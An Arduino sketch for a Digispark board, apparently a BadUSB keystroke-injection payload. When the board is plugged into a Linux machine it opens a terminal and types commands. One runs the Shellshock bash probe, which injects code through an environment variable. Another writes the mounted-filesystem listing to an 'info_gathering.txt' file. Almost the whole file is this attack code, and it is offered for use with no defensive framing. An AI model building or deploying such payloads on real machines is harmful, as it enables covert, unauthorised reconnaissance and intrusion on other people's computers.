#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F2,MOD_ALT_LEFT);
  delay(3000);
  DigiKeyboard.println("gnome-terminal");
  delay(3000);
  DigiKeyboard.println("echo \"Shellsock Bug Vulnerability: \" >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\" >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo \"Mounted filesystems: \" >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("mount -l >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo >> info_gathering.txt");
  while(1);
}
